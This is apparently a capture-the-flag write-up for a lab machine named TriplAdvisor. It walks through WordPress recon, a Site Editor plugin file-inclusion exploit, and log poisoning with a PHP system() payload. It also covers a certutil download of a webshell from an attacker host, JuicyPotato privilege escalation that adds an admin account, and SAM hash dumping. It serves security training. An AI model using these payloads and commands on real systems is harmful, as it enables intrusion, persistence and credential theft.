# TriplAdvisor

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.78:445
Open 10.0.2.78:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.78
PORT     STATE SERVICE       REASON  VERSION
445/tcp  open  microsoft-ds? syn-ack
8080/tcp open  http          syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://tripladvisor:8080/wordpress/
|_http-favicon: Unknown favicon MD5: 3BD2EC61324AD4D27CB7B0F484CD4289

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10156/tcp): CLEAN (Timeout)
|   Check 2 (port 32769/tcp): CLEAN (Timeout)
|   Check 3 (port 50724/udp): CLEAN (Timeout)
|   Check 4 (port 18339/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-09T07:27:08
|_  start_date: 2025-10-09T07:25:03
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: 11h59m58s
```
:::

## HTTP (8080)

No port 80, but 8080 is serving Wordpress instance. When you go to this port you're forced to use `http://tripladvisor/` hostname, add it to DNS or `/etc/hosts`.

![writeup.png](/assets/pentest/hackmyvm/tripladvisor/writeup.png)

### Scan

```bash
└─$ feroxbuster -u http://tripladvisor:8080/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 1004,`1018`
302      GET        0l        0w        0c http://tripladvisor:8080/ => http://tripladvisor:8080/wordpress/
200      GET     1128l     5919w    94780c http://tripladvisor:8080/phpinfo.php
301      GET        7l       20w      244c http://tripladvisor:8080/restricted => http://tripladvisor:8080/restricted/
200      GET        8l       42w     7333c http://tripladvisor:8080/Thumbs.db
302      GET        0l        0w        0c http://tripladvisor:8080/index.php => http://tripladvisor:8080/wordpress/
```

```bash
└─$ nuclei -u http://tripladvisor:8080/wordpress/ -tags wordpress
[wordpress-hello-dolly:detected_version] [http] [info] http://tripladvisor:8080/wordpress/wp-content/plugins/hello-dolly/readme.txt ["1.7.3"] [last_version="1.7.3"]
[wordpress-insert-headers-and-footers:outdated_version] [http] [info] http://tripladvisor:8080/wordpress/wp-content/plugins/insert-headers-and-footers/readme.txt ["2.1.14"] [last_version="2.2.9"]
[wordpress-readme-file] [http] [info] http://tripladvisor:8080/wordpress/readme.html
[wp-user-enum:usernames] [http] [low] http://tripladvisor:8080/wordpress/wp-json/wp/v2/users/ ["admin"]
[wordpress-directory-listing] [http] [info] http://tripladvisor:8080/wordpress/wp-content/uploads/
[wordpress-directory-listing] [http] [info] http://tripladvisor:8080/wordpress/wp-includes/
[wp-license-file] [http] [info] http://tripladvisor:8080/wordpress/license.txt
[wordpress-detect:version_by_js] [http] [info] http://tripladvisor:8080/wordpress/ ["5.1.19"]
[wordpress-theme-detect:expert-adventure-guide] [http] [info] http://tripladvisor:8080/wordpress/
[wordpress-rdf-user-enum] [http] [info] http://tripladvisor:8080/wordpress/feed/rdf ["admin"]
[wordpress-login] [http] [info] http://tripladvisor:8080/wordpress/wp-login.php
[wordpress-xmlrpc-detect] [http] [info] http://tripladvisor:8080/wordpress/xmlrpc.php
```

```bash
└─$ docker run -it --rm --add-host tripladvisor:10.0.2.78 wpscanteam/wpscan --url http://tripladvisor:8080/wordpress/ -e ap
[i] Plugin(s) Identified:

[+] editor
 | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
```

### LFI

[WordPress Plugin Site Editor 1.1.1 - Local File Inclusion](https://www.exploit-db.com/exploits/44340)

```bash
└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\Windows\System32\drivers\etc\hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
{"success":true,"data":{"output":[]}} 
```

```bash
└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log' -s | tail
10.0.2.15 - - [08/Oct/2025:13:16:19 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=file:///C:/xampp/htdocs/index.php HTTP/1.1" 302 - "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:17:28 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/index.php HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:17:39 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=php://filter/convert.base64-encode/resource=file:///C:/xampp/htdocs/index.php HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:18:37 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:19:25 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:19:29 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/apache.log HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:20:01 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/apache.log HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:20:04 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access/log HTTP/1.1" 200 72 "-" "curl/8.8.0"
10.0.2.15 - - [08/Oct/2025:13:20:06 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 2199009 "-" "curl/8.8.0"
{"success":true,"data":{"output":[]}} 
```

### RCE

We can chain the LFI into RCE with Log Poisoning method.

Determine the location, we know base location of server from [http://tripladvisor:8080/phpinfo.php](http://tripladvisor:8080/phpinfo.php)
```bash
└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../wp-config.php'
{"success":false,"message":"Error: didn't load shortcodes pattern file"}                                                                                                                                          
└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php'
# No Response, File exists

└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\htdocs\wordpress\wp-config.php'
# No Response, File exists
```

Poison the log
```bash
└─$ curl http://tripladvisor:8080/wordpress/ -A '<?php try { echo system($_REQUEST[0]); } catch (Throwable $e) {}; ?>'
```

::: info Note
Make sure to correctly type your PHP payload or you may fuck up real bad.
:::

Upload webshell or get reverse shell
```bash
└─$ curl 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log' -G --data-urlencode '0=certutil.exe -urlcache -f http://10.0.2.15/shell.php C:\xampp\htdocs\wordpress\shell.php'
```

### Web Shell

![writeup-1.png](/assets/pentest/hackmyvm/tripladvisor/writeup-1.png)

```bash
TRIPLADVISOR$@TriplAdvisor:C:\xampp\htdocs\wordpress# "C:\xampp\mysql\bin\mysql.exe" -u"wpuser" -p"ThisPassIsString" -D "wordpress" -e "SELECT user_login,user_pass FROM wp_users;"
Warning: Using a password on the command line interface can be insecure.
user_login	user_pass
admin	$P$BqwDhNmMj5pUt08pkLS9DL0mLo06Pa.
```

Somehow `whoami` command doesn't exist.
```powershell
TRIPLADVISOR$@TriplAdvisor:C:\xampp\htdocs\wordpress# whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

TRIPLADVISOR$@TriplAdvisor:C:\xampp\htdocs\wordpress# C:\Windows\System32\whoami.exe
'C:\Windows\System32\whoami.exe' is not recognized as an internal or external command,
operable program or batch file.

TRIPLADVISOR$@TriplAdvisor:C:\xampp\htdocs\wordpress# net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    websvc
The command completed with one or more errors.

TRIPLADVISOR$@TriplAdvisor:C:\xampp\htdocs\wordpress# net user websvc
User name                    websvc
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/25/2024 11:02:29 PM
Password expires             Never
Password changeable          11/25/2024 11:02:29 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/8/2025 1:40:12 PM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

### User.txt

```bash
TRIPLADVISOR$@TriplAdvisor:C:\Users\websvc# type C:\Users\websvc\Desktop\user.txt
4159a2b3a38697518722695cbb09ee46
```

## Privilege Escalation

```bash
└─$ curl -LOs https://github.com/h4rithd/PrecompiledBinaries/raw/refs/heads/main/whoami/whoami.exe
---
TRIPLADVISOR$@TriplAdvisor:C:\Users\websvc# certutil.exe -urlcache -f http://10.0.2.15/whoami.exe whoami.exe
websvc@TriplAdvisor:C:\Users\websvc# .\whoami.exe /PRIV

(X) SeChangeNotifyPrivilege= Bypass traverse checking
(X) SeImpersonatePrivilege= Impersonate a client after authentication
(X) SeCreateGlobalPrivilege= Create global objects
(O) SeIncreaseWorkingSetPrivilege= Increase a process working set
```

### SeImpersonatePrivilege

[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#seimpersonateprivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#seimpersonateprivilege)

```bash
└─$ curl -LOs https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
---
websvc@TriplAdvisor:C:\Users\websvc# certutil.exe -urlcache -f http://10.0.2.15/JuicyPotato.exe jp.exe
websvc@TriplAdvisor:C:\Users\websvc# .\jp.exe -t * -l 1234 -p "C:\Windows\System32\cmd.exe" -a "/c net user"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1234
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
```

```bash
websvc@TriplAdvisor:C:\Users\websvc# .\jp.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net user letmein Password123! /add && net localgroup administrators letmein /add && net localgroup \"Remote Management Users\" letmein /add"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

websvc@TriplAdvisor:C:\Users\websvc# net user letmein
User name                    letmein
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/8/2025 2:59:33 PM
Password expires             11/19/2025 2:59:33 PM
Password changeable          10/8/2025 2:59:33 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

```bash
└─$ impacket-psexec 'letmein':'Password123!'@10.0.2.78
C:\Windows\system32> whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> /Users/websvc/whoami.exe /all
[User]     = "NT AUTHORITY\SYSTEM"  S-1-5-18

[Group  1] = "BUILTIN\Administrators"  S-1-5-32-544
[Group  2] = "Everyone"  S-1-1-0
[Group  3] = "NT AUTHORITY\Authenticated Users"  S-1-5-11
[Group  4] = "Mandatory Label\System Mandatory Level"  S-1-16-16384


(O) SeAssignPrimaryTokenPrivilege   = Replace a process level token
(X) SeLockMemoryPrivilege     = Lock pages in memory
(O) SeIncreaseQuotaPrivilege     = Adjust memory quotas for a process
(X) SeTcbPrivilege     = Act as part of the operating system
(O) SeSecurityPrivilege     = Manage auditing and security log
(O) SeTakeOwnershipPrivilege     = Take ownership of files or other objects
(O) SeLoadDriverPrivilege     = Load and unload device drivers
(X) SeSystemProfilePrivilege     = Profile system performance
(O) SeSystemtimePrivilege     = Change the system time
(X) SeProfileSingleProcessPrivilege = Profile single process
(X) SeIncreaseBasePriorityPrivilege = Increase scheduling priority
(X) SeCreatePagefilePrivilege     = Create a pagefile
(X) SeCreatePermanentPrivilege     = Create permanent shared objects
(O) SeBackupPrivilege     = Back up files and directories
(O) SeRestorePrivilege     = Restore files and directories
(O) SeShutdownPrivilege     = Shut down the system
(X) SeDebugPrivilege     = Debug programs
(X) SeAuditPrivilege     = Generate security audits
(O) SeSystemEnvironmentPrivilege    = Modify firmware environment values
(X) SeChangeNotifyPrivilege     = Bypass traverse checking
(O) SeUndockPrivilege     = Remove computer from docking station
(O) SeManageVolumePrivilege     = Perform volume maintenance tasks
(X) SeImpersonatePrivilege     = Impersonate a client after authentication
(X) SeCreateGlobalPrivilege     = Create global objects
(X) SeIncreaseWorkingSetPrivilege   = Increase a process working set
(X) SeTimeZonePrivilege     = Change the time zone
(X) SeCreateSymbolicLinkPrivilege   = Create symbolic links
```

### Root.txt

```bash
C:\Users\Administrator> type .\Desktop\root.txt
5b38df6802c305e752c8f02358721acc
```

## P.S.

```bash
└─$ netexec smb 10.0.2.78 -u 'letmein2' -p 'Password123!' --sam
SMB         10.0.2.78       445    TRIPLADVISOR     [*] Windows 6.1 Build 7600 (name:TRIPLADVISOR) (domain:TriplAdvisor) (signing:False) (SMBv1:False)
SMB         10.0.2.78       445    TRIPLADVISOR     [+] TriplAdvisor\letmein2:Password123! (Pwn3d!)
SMB         10.0.2.78       445    TRIPLADVISOR     [*] Dumping SAM hashes
SMB         10.0.2.78       445    TRIPLADVISOR     Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
SMB         10.0.2.78       445    TRIPLADVISOR     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.78       445    TRIPLADVISOR     websvc:1003:aad3b435b51404eeaad3b435b51404ee:b0a913673f4f8d5debc49f8fcbbdbb68:::
SMB         10.0.2.78       445    TRIPLADVISOR     letmein:1006:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.0.2.78       445    TRIPLADVISOR     [+] Added 6 SAM hashes to the database
```